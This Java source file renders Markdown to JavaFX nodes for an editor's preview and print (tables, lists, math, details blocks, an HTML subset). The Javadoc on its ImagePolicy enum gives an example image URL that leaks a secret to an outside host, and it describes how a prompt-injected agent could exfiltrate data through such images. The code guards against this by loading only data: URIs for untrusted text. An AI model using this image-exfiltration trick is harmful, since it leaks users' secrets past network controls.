package com.editora.editor;

import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import javafx.application.Platform;
import javafx.geometry.Pos;
import javafx.scene.Node;
import javafx.scene.control.CheckBox;
import javafx.scene.control.Label;
import javafx.scene.control.Separator;
import javafx.scene.control.Tooltip;
import javafx.scene.image.ImageView;
import javafx.scene.layout.ColumnConstraints;
import javafx.scene.layout.GridPane;
import javafx.scene.layout.HBox;
import javafx.scene.layout.Pane;
import javafx.scene.layout.Priority;
import javafx.scene.layout.StackPane;
import javafx.scene.layout.VBox;
import javafx.scene.text.Text;
import javafx.scene.text.TextFlow;

import com.editora.i18n.Messages;
import com.editora.markdown.MarkdownMath;
import org.commonmark.ext.autolink.AutolinkExtension;
import org.commonmark.ext.footnotes.FootnoteDefinition;
import org.commonmark.ext.footnotes.FootnoteReference;
import org.commonmark.ext.footnotes.FootnotesExtension;
import org.commonmark.ext.footnotes.InlineFootnote;
import org.commonmark.ext.front.matter.YamlFrontMatterBlock;
import org.commonmark.ext.front.matter.YamlFrontMatterExtension;
import org.commonmark.ext.front.matter.YamlFrontMatterNode;
import org.commonmark.ext.gfm.strikethrough.Strikethrough;
import org.commonmark.ext.gfm.strikethrough.StrikethroughExtension;
import org.commonmark.ext.gfm.tables.TableBlock;
import org.commonmark.ext.gfm.tables.TableCell;
import org.commonmark.ext.gfm.tables.TableRow;
import org.commonmark.ext.gfm.tables.TablesExtension;
import org.commonmark.ext.ins.Ins;
import org.commonmark.ext.ins.InsExtension;
import org.commonmark.ext.task.list.items.TaskListItemMarker;
import org.commonmark.ext.task.list.items.TaskListItemsExtension;
import org.commonmark.node.BlockQuote;
import org.commonmark.node.BulletList;
import org.commonmark.node.Code;
import org.commonmark.node.Emphasis;
import org.commonmark.node.FencedCodeBlock;
import org.commonmark.node.HardLineBreak;
import org.commonmark.node.Heading;
import org.commonmark.node.HtmlBlock;
import org.commonmark.node.HtmlInline;
import org.commonmark.node.IndentedCodeBlock;
import org.commonmark.node.Link;
import org.commonmark.node.ListItem;
import org.commonmark.node.OrderedList;
import org.commonmark.node.Paragraph;
import org.commonmark.node.SoftLineBreak;
import org.commonmark.node.StrongEmphasis;
import org.commonmark.node.ThematicBreak;
import org.commonmark.parser.IncludeSourceSpans;
import org.commonmark.parser.Parser;
import org.eclipse.tm4e.core.grammar.IGrammar;
import org.fxmisc.richtext.model.StyleSpan;
import org.fxmisc.richtext.model.StyleSpans;

/**
 * Renders Markdown to native JavaFX nodes for the in-editor preview. Parsing (CommonMark + GFM
 * extensions: tables, strikethrough, task lists, autolinks) is a pure off-thread step
 * ({@link #parseToDocument}); building the JavaFX node tree must run on the FX thread
 * ({@link #renderDocument}). Colors/sizes come from CSS ({@code .markdown-preview} + {@code .md-*}
 * classes), so the preview follows the active editor theme.
 */
public final class MarkdownRenderer {

    /** Readable column width (GitHub-style): the content is capped to this and centered in the pane. */
    private static final double MAX_CONTENT_WIDTH = 860;
    /** An image is shown at its own size up to the text width of that column (its 24px side padding off). */
    private static final double MAX_IMAGE_WIDTH = MAX_CONTENT_WIDTH - 48;
    /** Point sizes passed to JLaTeXMath for inline {@code $…$} and display {@code $$…$$} math. */
    private static final double INLINE_MATH_SIZE = 16;

    private static final double DISPLAY_MATH_SIZE = 20;

    /** Parser/text extensions, shared so the AST and the plain-text rendering stay in sync. (The
     *  heading-anchor extension is renderer-only — it's added to the HTML renderer in {@code
     *  MarkdownHtmlExport}, not here.) */
    static final List<org.commonmark.Extension> EXTENSIONS = List.of(
            TablesExtension.create(),
            StrikethroughExtension.create(),
            TaskListItemsExtension.create(),
            AutolinkExtension.create(),
            YamlFrontMatterExtension.create(),
            FootnotesExtension.create(),
            InsExtension.create());

    private static final Parser PARSER = Parser.builder().extensions(EXTENSIONS).build();

    /**
     * The parse this class <em>renders</em> (preview, print, the popups): the shared extensions, plus inline
     * footnotes ({@code ^[note]}), parser-level math ({@link MarkdownMath}) when {@code math}, and the source
     * lines of every block — which is what lets the preview reuse an unchanged block's nodes and line itself up
     * with the editor. The exporters still read {@link #parseToDocument}; they adopt this parse one by one.
     */
    private static Parser renderParser(boolean math) {
        List<org.commonmark.Extension> ext = new ArrayList<>();
        for (org.commonmark.Extension e : EXTENSIONS) {
            if (!(e instanceof FootnotesExtension)) {
                ext.add(e);
            }
        }
        ext.add(FootnotesExtension.builder().inlineFootnotes(true).build());
        if (math) {
            ext.add(MarkdownMath.extension());
        }
        return Parser.builder()
                .extensions(ext)
                .includeSourceSpans(IncludeSourceSpans.BLOCKS)
                .build();
    }

    private static final Parser RENDER_PARSER = renderParser(false);
    private static final Parser MATH_PARSER = renderParser(true);

    /** Renders the same AST to plain text (markup stripped) — "what you see" in the preview, for copy. */
    private static final org.commonmark.renderer.text.TextContentRenderer TEXT_RENDERER =
            org.commonmark.renderer.text.TextContentRenderer.builder()
                    .extensions(EXTENSIONS)
                    .build();

    private MarkdownRenderer() {}

    /** Parses Markdown to a CommonMark AST. Pure CPU — safe to call off the FX thread. */
    public static org.commonmark.node.Node parseToDocument(String markdown) {
        return PARSER.parse(markdown == null ? "" : markdown);
    }

    /** Parses Markdown for {@link #renderDocument}/{@link #renderForPrint}: math is recognised by the parser
     *  (when the feature is on) and blocks carry their source lines. Pure CPU — safe off the FX thread. */
    public static org.commonmark.node.Node parseForRender(String markdown) {
        return parseForRender(markdown, MathImages.isEnabled());
    }

    static org.commonmark.node.Node parseForRender(String markdown, boolean math) {
        return (math ? MATH_PARSER : RENDER_PARSER).parse(markdown == null ? "" : markdown);
    }

    /** The Markdown rendered to plain text (the visible text with markup removed) — for "Copy" from the
     *  preview. Pure CPU; safe to call off the FX thread. */
    public static String plainText(String markdown) {
        return TEXT_RENDERER.render(parseToDocument(markdown));
    }

    /** Builds a JavaFX node tree from a parsed AST. MUST run on the FX thread (creates Text/ImageView). */
    public static Node renderDocument(org.commonmark.node.Node ast, Path baseDir) {
        return renderDocument(ast, baseDir, null);
    }

    /**
     * Overload that also wires links to a click handler — invoked with the link's raw destination
     * (as written in the Markdown; never resolved/normalized) when a rendered link is clicked. Used by the
     * live, interactive preview so a link opens in the system browser; pass {@code null} for
     * non-interactive renders (print/PDF don't build this JavaFX tree at all, and the hover/completion-doc
     * popups pass null since they're ephemeral display surfaces, not meant to be clicked through).
     */
    public static Node renderDocument(
            org.commonmark.node.Node ast, Path baseDir, java.util.function.Consumer<String> onLinkClick) {
        return renderDocument(ast, baseDir, onLinkClick, ImagePolicy.DOCUMENT);
    }

    /**
     * Which images a render may load. An image loads the moment it is rendered, with no click — so on a
     * surface whose Markdown the user did not write, {@code ![](https://host/?d=<secret>)} is an outbound
     * request somebody else chose. A prompt-injected agent can exfiltrate through it past its own network
     * permissions; a language server's hover text or a pull-request body can do the same.
     */
    public enum ImagePolicy {
        /** The user's own document (preview, print): files beside it, {@code data:} URIs, and public
         *  {@code http(s)} hosts through {@link PreviewImageLoader}'s internal-address guard. */
        DOCUMENT,
        /** Text from elsewhere — agent replies, LSP hover / completion docs, PR bodies: only self-contained
         *  {@code data:} URIs load; anything else renders as a placeholder naming the alt text and URL. */
        DATA_ONLY;

        /** Whether an image at {@code url} (already resolved to an absolute URL) may load. Pure; unit-tested. */
        boolean allows(String url) {
            if (url == null || url.isBlank()) {
                return false;
            }
            if (this == DOCUMENT) {
                // (the one switch the user has: no http(s) image is fetched while it is off)
                return PreviewImageLoader.remoteImages() || !PreviewImageLoader.isRemote(url);
            }
            return url.stripLeading().regionMatches(true, 0, "data:", 0, 5);
        }
    }

    /** As {@link #renderDocument(org.commonmark.node.Node, Path, java.util.function.Consumer)}, with an
     *  explicit {@link ImagePolicy} — every surface that renders Markdown it did not get from the user's own
     *  file passes {@link ImagePolicy#DATA_ONLY}. */
    public static Node renderDocument(
            org.commonmark.node.Node ast,
            Path baseDir,
            java.util.function.Consumer<String> onLinkClick,
            ImagePolicy images) {
        return renderDocument(
                ast,
                new RenderContext(
                        baseDir, onLinkClick, images == null ? ImagePolicy.DATA_ONLY : images, false, null, null));
    }

    /**
     * Builds the node tree for <b>print</b>: the same blocks as the preview, but final the moment this returns.
     *
     * <p>The preview fills images, Mermaid diagrams and syntax colours in later, from background loads. A
     * printed page is measured, packed and sent in one pulse, so "later" is after the paper: fences printed
     * uncoloured, and an image that measured 0px while loading grew afterwards and pushed the rest of its
     * page off the sheet. Here they come from {@code assets}, resolved beforehand off the FX thread
     * ({@link MarkdownPrintAssets#resolve}); an image that did not load prints as its alt text.
     *
     * <p>Print is also always light, so math is rasterised dark-on-white whatever the app theme is, and a
     * code block is one node per line so the paginator can cut it between lines (see {@link #printCodeBlock}).
     *
     * <p>With {@code assets} null the document was not resolved: images and diagrams then load in the
     * background as the preview's do and code prints uncoloured. Only for callers that cannot block first.
     */
    public static Node renderForPrint(org.commonmark.node.Node ast, Path baseDir, MarkdownPrintAssets assets) {
        return renderDocument(ast, new RenderContext(baseDir, null, ImagePolicy.DOCUMENT, true, assets, null));
    }

    private static Node renderDocument(org.commonmark.node.Node ast, RenderContext ctx) {
        VBox content = newColumn();
        if (ast != null) {
            appendBlocks(ast, content, ctx);
        }
        return wrapColumn(content);
    }

    /** The empty reading column blocks are added to. */
    static VBox newColumn() {
        return styleColumn(new VBox());
    }

    /** Gives {@code content} the column's style class and width cap. */
    static <T extends VBox> T styleColumn(T content) {
        content.getStyleClass().add("markdown-preview");
        // Cap the readable column width so long lines don't stretch across a wide window (GitHub-style).
        content.setMaxWidth(MAX_CONTENT_WIDTH);
        return content;
    }

    /** Centers the capped-width column within the (fit-to-width) preview pane. A StackPane clamps the content
     *  to the available width when the viewport is narrower than the cap, so it never overflows. */
    static StackPane wrapColumn(VBox content) {
        StackPane wrap = new StackPane(content);
        wrap.getStyleClass().add("markdown-preview-wrap");
        StackPane.setAlignment(content, Pos.TOP_CENTER);
        return wrap;
    }

    /** The context of the live document preview. {@code dark} is the preview's own theme when it has one
     *  (the light/dark toggle), or null to follow the app theme. */
    static RenderContext previewContext(Path baseDir, java.util.function.Consumer<String> onLinkClick, Boolean dark) {
        return new RenderContext(baseDir, onLinkClick, ImagePolicy.DOCUMENT, false, null, dark);
    }

    /** Threaded through every block/inline renderer alongside {@code baseDir} (for image resolution) so a
     *  link's click handler reaches the {@code Link} node without a parameter per call — the pure-{@code
     *  baseDir} idiom this file already used, extended to carry one more per-render input. */
    record RenderContext(
            Path baseDir,
            java.util.function.Consumer<String> onLinkClick,
            ImagePolicy images,
            boolean print,
            MarkdownPrintAssets assets,
            Boolean dark) {

        /**
         * Whether math and diagrams are drawn light-on-dark: never on paper; as the surface's own theme says
         * when it has one; otherwise as the app theme does (null). They are bitmaps, so the preview's CSS
         * theme cannot recolour them — drawn for the app theme on a preview toggled the other way, a formula
         * was dark on dark.
         */
        Boolean glyphsDark() {
            return print ? Boolean.FALSE : dark;
        }

        Node blockMath(String latex) {
            Boolean d = glyphsDark();
            return d == null
                    ? MathImages.blockNode(latex, DISPLAY_MATH_SIZE)
                    : MathImages.blockNode(latex, DISPLAY_MATH_SIZE, d);
        }

        Node inlineMath(String latex) {
            Boolean d = glyphsDark();
            return d == null
                    ? MathImages.inlineNode(latex, INLINE_MATH_SIZE)
                    : MathImages.inlineNode(latex, INLINE_MATH_SIZE, d);
        }
    }

    // --- block level ---------------------------------------------------------------------------

    private static void appendBlocks(org.commonmark.node.Node parent, Pane container, RenderContext ctx) {
        appendBlocks(parent.getFirstChild(), null, container, ctx);
    }

    /** Renders the siblings from {@code first} up to (not including) {@code end} into {@code container}. */
    private static void appendBlocks(
            org.commonmark.node.Node first, org.commonmark.node.Node end, Pane container, RenderContext ctx) {
        for (org.commonmark.node.Node n = first; n != null && n != end; ) {
            org.commonmark.node.Node last = groupEnd(n, ctx.print());
            Node fx = renderGroup(n, last, ctx);
            if (fx != null) {
                container.getChildren().add(fx);
            }
            n = last.getNext();
        }
    }

    /**
     * The last sibling of the unit that starts at {@code n}: {@code n} itself, except for an HTML block that
     * opens a {@code <details>} it does not close — then the block that closes it, so the Markdown blocks in
     * between become the body of one collapsible element. Print keeps every block on its own.
     */
    static org.commonmark.node.Node groupEnd(org.commonmark.node.Node n, boolean print) {
        if (print || !(n instanceof HtmlBlock open)) {
            return n;
        }
        int depth = MarkdownHtml.detailsDepth(open.getLiteral());
        if (depth <= 0) {
            return n;
        }
        for (org.commonmark.node.Node s = n.getNext(); s != null; s = s.getNext()) {
            if (s instanceof HtmlBlock hb) {
                depth += MarkdownHtml.detailsDepth(hb.getLiteral());
                if (depth <= 0) {
                    return s;
                }
            }
        }
        return n; // never closed: nothing to fold
    }

    /** Renders the unit {@code first}…{@code last} (see {@link #groupEnd}); null when it shows nothing. */
    static Node renderGroup(org.commonmark.node.Node first, org.commonmark.node.Node last, RenderContext ctx) {
        return first == last ? renderBlock(first, ctx) : detailsBlock((HtmlBlock) first, last, ctx);
    }

    private static Node renderBlock(org.commonmark.node.Node node, RenderContext ctx) {
        if (node instanceof Heading h) {
            TextFlow tf = inlineFlow(h, ctx);
            tf.getStyleClass().add("md-h" + Math.min(6, Math.max(1, h.getLevel())));
            tf.setAccessibleRole(javafx.scene.AccessibleRole.TEXT);
            tf.setAccessibleText(textOf(tf));
            return tf;
        }
        if (node instanceof MarkdownMath.Block math) {
            if (math.isClosed()) {
                return displayMath(math.getLatex(), ctx);
            }
            // Never closed: it is not a formula yet — show what was typed.
            TextFlow tf = new TextFlow(styledText(MarkdownMath.source(math), List.of()));
            tf.getStyleClass().add("md-paragraph");
            return tf;
        }
        if (node instanceof Paragraph p) {
            // A paragraph that is just $$…$$ renders as a centered block formula.
            if (p.getFirstChild() instanceof MarkdownMath.Inline m && m.getNext() == null && m.isDisplay()) {
                return displayMath(m.getLatex(), ctx);
            }
            // A paragraph that is just an image renders as a block image (not squeezed into a TextFlow).
            if (p.getFirstChild() instanceof org.commonmark.node.Image img && img.getNext() == null) {
                // Fits a pane narrower than the image instead of widening the whole column.
                return new ShrinkToFit(imageNode(img, ctx));
            }
            TextFlow tf = inlineFlow(p, ctx);
            tf.getStyleClass().add("md-paragraph");
            return tf;
        }
        if (node instanceof BlockQuote) {
            VBox box = new VBox();
            box.getStyleClass().add("md-quote");
            appendBlocks(node, box, ctx);
            return box;
        }
        if (node instanceof BulletList bl) {
            return renderList(bl, ctx, false, 1);
        }
        if (node instanceof OrderedList ol) {
            Integer start = ol.getMarkerStartNumber();
            return renderList(ol, ctx, true, start == null ? 1 : start);
        }
        if (node instanceof FencedCodeBlock f) {
            if (isMermaidInfo(f.getInfo()) && MermaidImages.isEnabled()) {
                if (ctx.assets() != null) { // print: already rendered (light), so its size is final now
                    return new ShrinkToFit(MermaidImages.printNode(
                            ctx.assets().diagram(stripTrailingNewline(f.getLiteral())),
                            lw -> Math.min(lw, MAX_CONTENT_WIDTH)));
                }
                // Show at natural size, but never wider than the reading column — and scaled down further
                // when the pane itself is narrower (Split view), so the diagram never widens the column.
                return new ShrinkToFit(MermaidImages.node(
                        stripTrailingNewline(f.getLiteral()), lw -> Math.min(lw, MAX_CONTENT_WIDTH), null, ctx.dark()));
            }
            if (ctx.print()) {
                String code = stripTrailingNewline(f.getLiteral());
                return printCodeBlock(
                        code, ctx.assets() == null ? null : ctx.assets().runs(f.getInfo(), code));
            }
            return highlightedCodeBlock(f.getLiteral(), f.getInfo());
        }
        if (node instanceof IndentedCodeBlock i) {
            return codeBlock(i.getLiteral(), ctx); // indented blocks carry no language → plain
        }
        if (node instanceof ThematicBreak) {
            Separator s = new Separator();
            s.getStyleClass().add("md-hr");
            return s;
        }
        if (node instanceof HtmlBlock hb) {
            if (ctx.print()) {
                // Print keeps its one-node-per-block shapes: comments invisible, other raw HTML as its source.
                return isHtmlComment(hb.getLiteral()) ? null : codeBlock(hb.getLiteral(), ctx);
            }
            return htmlBlock(MarkdownHtml.tokens(hb.getLiteral()), ctx); // the safe subset; the rest is dropped
        }
        if (node instanceof TableBlock tb) {
            return renderTable(tb, ctx);
        }
        if (node instanceof YamlFrontMatterBlock fm) {
            return frontMatterBlock(fm);
        }
        if (node instanceof FootnoteDefinition def) {
            return footnoteDefinition(def, ctx);
        }
        // Unknown block container: render its children.
        VBox box = new VBox();
        appendBlocks(node, box, ctx);
        return box.getChildren().isEmpty() ? null : box;
    }

    /** Whether a raw-HTML literal is nothing but HTML comments ({@code <!-- … -->}) — rendered invisibly.
     *  A comment followed by content on its line ({@code <!-- note --> text}) is not: the text shows. Pure. */
    public static boolean isHtmlComment(String literal) {
        return literal != null
                && literal.strip().startsWith("<!--")
                && MarkdownHtml.strip(literal).isBlank();
    }

    /** A display formula on a line of its own, centered; a long one shrinks rather than widening the column. */
    private static Node displayMath(String latex, RenderContext ctx) {
        StackPane wrap = new StackPane(ctx.blockMath(latex));
        wrap.getStyleClass().add("md-math-block-wrap");
        return new ShrinkToFit(wrap);
    }

    /**
     * A block of raw HTML, as far as the safe subset goes ({@link MarkdownHtml}): text in paragraphs and
     * headings, {@code align="center"}, the inline formatting tags, {@code <br>}, {@code <hr>}, {@code <img>},
     * {@code <a href>} and {@code <pre>}. Unknown tags are dropped and their text kept; null when nothing is
     * left to show (a comment, an empty wrapper).
     */
    private static Node htmlBlock(List<MarkdownHtml.Token> tokens, RenderContext ctx) {
        HtmlBlocks b = new HtmlBlocks(ctx);
        tokens.forEach(b::add);
        return b.finish();
    }

    /** Builds the nodes of one HTML block token by token: a new text flow per block-level tag. */
    private static final class HtmlBlocks {
        private final RenderContext ctx;
        private final VBox out = new VBox();
        private final InlineHtml inline = new InlineHtml();
        /** Open block-level tags, innermost last: name, and whether it centres its content. */
        private final List<MarkdownHtml.Tag> frames = new ArrayList<>();

        private TextFlow flow;
        private StringBuilder pre;

        HtmlBlocks(RenderContext ctx) {
            this.ctx = ctx;
            out.getStyleClass().add("md-html");
        }

        void add(MarkdownHtml.Token token) {
            if (token instanceof MarkdownHtml.Chars chars) {
                text(chars.text());
            } else if (token instanceof MarkdownHtml.Tag tag) {
                tag(tag);
            }
        }

        private void text(String raw) {
            if (pre != null) {
                pre.append(raw);
                return;
            }
            String text = MarkdownHtml.collapse(raw);
            if (flow == null || flow.getChildren().isEmpty()) {
                text = text.stripLeading();
            }
            if (!text.isEmpty()) {
                emitText(text, flow(), inline.styles(List.of()), ctx);
            }
        }

        private void tag(MarkdownHtml.Tag tag) {
            String name = tag.name();
            if (pre != null) {
                if (name.equals("pre") && tag.close()) {
                    String code = pre.toString();
                    pre = null;
                    out.getChildren().add(codeBlock(code.startsWith("\n") ? code.substring(1) : code));
                }
                return; // tags inside <pre> are dropped, their text kept
            }
            if (name.equals("pre") && !tag.close()) {
                endFlow();
                pre = new StringBuilder();
            } else if (name.equals("hr")) {
                endFlow();
                Separator rule = new Separator();
                rule.getStyleClass().add("md-hr");
                out.getChildren().add(rule);
            } else if (MarkdownHtml.isBlockTag(name)) {
                endFlow();
                if (!tag.close()) {
                    frames.add(tag);
                } else {
                    for (int i = frames.size() - 1; i >= 0; i--) {
                        if (frames.get(i).name().equals(name)) {
                            frames.subList(i, frames.size()).clear();
                            break;
                        }
                    }
                }
            } else {
                if (name.equals("br") || name.equals("img") || (name.equals("a") && !tag.close())) {
                    flow(); // these add to (or start) the current line
                }
                inline.tag(tag, flow == null ? new TextFlow() : flow, ctx);
            }
        }

        private TextFlow flow() {
            if (flow == null) {
                flow = new TextFlow();
                int heading = 0;
                boolean center = false;
                for (MarkdownHtml.Tag frame : frames) {
                    heading = Math.max(heading, MarkdownHtml.headingLevel(frame.name()));
                    center |= MarkdownHtml.centered(frame);
                }
                flow.getStyleClass().add(heading > 0 ? "md-h" + heading : "md-paragraph");
                if (center) {
                    flow.setTextAlignment(javafx.scene.text.TextAlignment.CENTER);
                }
            }
            return flow;
        }

        private void endFlow() {
            if (flow != null) {
                inline.close(flow, ctx);
                if (!flow.getChildren().isEmpty()) {
                    out.getChildren().add(flow);
                }
                flow = null;
            }
        }

        Node finish() {
            if (pre != null) {
                out.getChildren().add(codeBlock(pre.toString()));
                pre = null;
            }
            endFlow();
            return switch (out.getChildren().size()) {
                case 0 -> null;
                case 1 -> out.getChildren().get(0);
                default -> out;
            };
        }
    }

    /**
     * {@code <details>} … {@code </details>} around Markdown blocks: a disclosure that shows its
     * {@code <summary>} and folds the rest, closed unless the tag says {@code open}. {@code open} is the HTML
     * block with the opening tag, {@code close} the one with the closing tag; the siblings between them are
     * the body, rendered like any other blocks.
     */
    private static Node detailsBlock(HtmlBlock open, org.commonmark.node.Node close, RenderContext ctx) {
        List<MarkdownHtml.Token> tokens = MarkdownHtml.tokens(open.getLiteral());
        boolean expanded = false;
        List<MarkdownHtml.Token> summary = new ArrayList<>();
        List<MarkdownHtml.Token> rest = new ArrayList<>();
        int state = 0; // 0 before <details>, 1 inside it, 2 inside <summary>, 3 after </summary>
        for (MarkdownHtml.Token t : tokens) {
            MarkdownHtml.Tag tag = t instanceof MarkdownHtml.Tag x ? x : null;
            if (state == 0) {
                if (tag != null && tag.name().equals("details") && !tag.close()) {
                    expanded = tag.attrs().containsKey("open");
                    state = 1;
                } else {
                    rest.add(t);
                }
            } else if (state == 1 && tag != null && tag.name().equals("summary") && !tag.close()) {
                state = 2;
            } else if (state == 2) {
                if (tag != null && tag.name().equals("summary")) {
                    state = 3;
                } else {
                    summary.add(t);
                }
            } else {
                rest.add(t);
            }
        }
        TextFlow title = new TextFlow();
        InlineHtml inline = new InlineHtml();
        for (MarkdownHtml.Token t : summary) {
            if (t instanceof MarkdownHtml.Chars c) {
                emitText(MarkdownHtml.collapse(c.text()), title, inline.styles(List.of("md-bold")), ctx);
            } else if (t instanceof MarkdownHtml.Tag tag) {
                inline.tag(tag, title, ctx);
            }
        }
        if (title.getChildren().isEmpty()) {
            title.getChildren().add(styledText(Messages.tr("markdown.preview.details"), List.of("md-bold")));
        }
        Label arrow = new Label();
        arrow.getStyleClass().add("md-details-arrow");
        HBox header = new HBox(arrow, title);
        header.getStyleClass().add("md-details-summary");
        HBox.setHgrow(title, Priority.ALWAYS);
        VBox body = new VBox();
        body.getStyleClass().add("md-details-body");
        Node lead = htmlBlock(rest, ctx);
        if (lead != null) {
            body.getChildren().add(lead);
        }
        appendBlocks(open.getNext(), close, body, ctx);
        VBox box = new VBox(header, body);
        box.getStyleClass().add("md-details");
        Runnable apply = () -> {
            boolean on = body.isVisible();
            arrow.setText(on ? "\u25BE" : "\u25B8");
            header.setAccessibleText(textOf(title));
        };
        body.setVisible(expanded);
        body.setManaged(expanded);
        apply.run();
        Runnable toggle = () -> {
            boolean on = !body.isVisible();
            body.setVisible(on);
            body.setManaged(on);
            apply.run();
        };
        header.setCursor(javafx.scene.Cursor.HAND);
        header.setFocusTraversable(true);
        header.setAccessibleRole(javafx.scene.AccessibleRole.BUTTON);
        header.setOnMouseClicked(e -> {
            if (followsLink(e.getButton(), e.isStillSincePress())) {
                toggle.run();
            }
        });
        header.setOnKeyPressed(e -> {
            if (e.getCode() == javafx.scene.input.KeyCode.ENTER || e.getCode() == javafx.scene.input.KeyCode.SPACE) {
                toggle.run();
                e.consume();
            }
        });
        return box;
    }

    /** The visible text of a rendered flow (its {@code Text} and label runs), for accessible names. */
    private static String textOf(TextFlow flow) {
        StringBuilder sb = new StringBuilder();
        for (Node n : flow.getChildren()) {
            if (n instanceof Text t) {
                sb.append(t.getText());
            } else if (n instanceof Label l && l.getText() != null) {
                sb.append(l.getText());
            }
        }
        return sb.toString().strip();
    }

    private static Node renderList(org.commonmark.node.Node list, RenderContext ctx, boolean ordered, int start) {
        VBox box = new VBox();
        box.getStyleClass().add("md-list");
        int n = start;
        for (org.commonmark.node.Node item = list.getFirstChild(); item != null; item = item.getNext()) {
            if (!(item instanceof ListItem)) {
                continue;
            }
            HBox row = new HBox();
            row.getStyleClass().add("md-list-item");
            TaskListItemMarker task = firstTaskMarker(item);
            Node marker;
            if (task != null) {
                CheckBox cb = new CheckBox();
                cb.setSelected(task.isChecked());
                cb.setDisable(true); // shows the source's state; styled at full strength (.md-task in app.css)
                cb.setFocusTraversable(false);
                cb.getStyleClass().add("md-task");
                marker = cb;
            } else {
                Label m = new Label(ordered ? (n + ".") : "•");
                m.getStyleClass().add("md-list-marker");
                marker = m;
            }
            VBox content = new VBox();
            content.getStyleClass().add("md-list-content");
            HBox.setHgrow(content, Priority.ALWAYS);
            appendBlocks(item, content, ctx);
            row.getChildren().addAll(marker, content);
            box.getChildren().add(row);
            n++;
        }
        return box;
    }

    /** A table column never narrower/wider than this many "characters" of weight (keeps short columns
     *  readable and stops one long cell from starving the rest). */
    private static final int MIN_COL_WEIGHT = 6;

    private static final int MAX_COL_WEIGHT = 40;

    /** The horizontal padding on each table cell, expressed in average text-character widths. */
    private static final int TABLE_CELL_PADDING_WEIGHT = 3;

    private static Node renderTable(TableBlock tb, RenderContext ctx) {
        GridPane grid = new GridPane();
        grid.getStyleClass().add("md-table");
        // Fill the preview column so the percent-based ColumnConstraints below have a definite width to
        // distribute; without constraints a long cell forces the others to collapse to ~1 char wide.
        grid.setMaxWidth(Double.MAX_VALUE);

        List<Integer> colWeights = new ArrayList<>();
        List<Integer> colWords = new ArrayList<>();
        int row = 0;
        for (org.commonmark.node.Node section = tb.getFirstChild(); section != null; section = section.getNext()) {
            boolean header = section instanceof org.commonmark.ext.gfm.tables.TableHead;
            for (org.commonmark.node.Node r = section.getFirstChild(); r != null; r = r.getNext()) {
                if (!(r instanceof TableRow)) {
                    continue;
                }
                int col = 0;
                for (org.commonmark.node.Node c = r.getFirstChild(); c != null; c = c.getNext()) {
                    if (!(c instanceof TableCell cell)) {
                        continue;
                    }
                    TextFlow tf = inlineFlow(cell, ctx);
                    tf.getStyleClass().add(header ? "md-table-header" : "md-table-cell");
                    tf.setMaxWidth(Double.MAX_VALUE);
                    if (cell.getAlignment() == TableCell.Alignment.CENTER) {
                        tf.setTextAlignment(javafx.scene.text.TextAlignment.CENTER);
                    } else if (cell.getAlignment() == TableCell.Alignment.RIGHT) {
                        tf.setTextAlignment(javafx.scene.text.TextAlignment.RIGHT);
                    }
                    grid.add(tf, col, row);
                    int len = cellTextLength(cell);
                    int word = longestToken(cell);
                    if (col < colWeights.size()) {
                        colWeights.set(col, Math.max(colWeights.get(col), len));
                        colWords.set(col, Math.max(colWords.get(col), word));
                    } else {
                        colWeights.add(len);
                        colWords.add(word);
                    }
                    col++;
                }
                row++;
            }
        }

        int cols = colWeights.size();
        double total = 0;
        double[] clamped = new double[cols];
        for (int i = 0; i < cols; i++) {
            clamped[i] = tableColumnWeight(colWeights.get(i));
            total += clamped[i];
        }
        double[] share = new double[cols];
        for (int i = 0; i < cols; i++) {
            share[i] = total > 0 ? clamped[i] / total : 1.0 / Math.max(1, cols);
            ColumnConstraints cc = new ColumnConstraints();
            cc.setPercentWidth(share[i] * 100.0);
            cc.setHgrow(Priority.ALWAYS);
            grid.getColumnConstraints().add(cc);
        }
        if (ctx.print()) {
            return grid; // the print layout fits columns to the sheet itself
        }
        // On screen the table is never narrower than its columns need for their longest word; a pane narrower
        // than that scrolls the table sideways instead of breaking "v15" into "v1" / "5".
        grid.setMinWidth(tableMinWidth(colWords, share));
        return new SideScroll(grid);
    }

    /** Average width of a character of table text at the base font, and a cell's padding + border, in px. */
    private static final double TABLE_CHAR_PX = 8.5;

    private static final double TABLE_CELL_CHROME_PX = 20;
    /** A word longer than this may break inside a cell; a column is never asked to fit more on one line. */
    private static final int MAX_UNBROKEN_WORD = 28;

    /**
     * The narrowest a table can be so that every column, at its percentage {@code share} of the width, still
     * fits its longest word ({@code words}, in characters) on one line. Pure; unit-tested.
     */
    static double tableMinWidth(List<Integer> words, double[] share) {
        double min = 0;
        for (int i = 0; i < share.length && i < words.size(); i++) {
            double need = Math.min(words.get(i), MAX_UNBROKEN_WORD) * TABLE_CHAR_PX + TABLE_CELL_CHROME_PX;
            if (share[i] > 0) {
                min = Math.max(min, need / share[i]);
            }
        }
        return Math.ceil(min);
    }

    /** The longest run of non-space characters in a cell's text; an inline-code run counts as its longest
     *  piece (see {@link #codeChunks}), since the pieces are what cannot break. */
    private static int longestToken(org.commonmark.node.Node node) {
        int longest = 0;
        for (org.commonmark.node.Node n = node.getFirstChild(); n != null; n = n.getNext()) {
            if (n instanceof org.commonmark.node.Text t) {
                for (String word : t.getLiteral().split("\\s+")) {
                    longest = Math.max(longest, word.length());
                }
            } else if (n instanceof Code c) {
                for (String chunk : codeChunks(c.getLiteral())) {
                    longest = Math.max(longest, chunk.length() + 1);
                }
            } else {
                longest = Math.max(longest, longestToken(n));
            }
        }
        return longest;
    }

    /**
     * Converts a cell's content length to a proportional table-column width. The visible content needs
     * room in addition to the fixed left and right cell padding; omitting that allowance makes concise
     * columns such as {@code ID}, {@code Priority}, and {@code Smoke} wrap one character at a time.
     */
    static int tableColumnWeight(int textLength) {
        return Math.min(Math.max(textLength + TABLE_CELL_PADDING_WEIGHT, MIN_COL_WEIGHT), MAX_COL_WEIGHT);
    }

    /** Total length of the cell's plain text (across inline markup), used to weight column widths. */
    private static int cellTextLength(org.commonmark.node.Node node) {
        int len = 0;
        for (org.commonmark.node.Node n = node.getFirstChild(); n != null; n = n.getNext()) {
            if (n instanceof org.commonmark.node.Text t) {
                len += t.getLiteral().length();
            } else if (n instanceof Code c) {
                len += c.getLiteral().length();
            } else {
                len += cellTextLength(n);
            }
        }
        return len;
    }

    private static Node codeBlock(String literal, RenderContext ctx) {
        return ctx.print() ? printCodeBlock(stripTrailingNewline(literal), null) : codeBlock(literal);
    }

    /**
     * A code block for print: a box of lines, each its own {@code TextFlow} of token runs.
     *
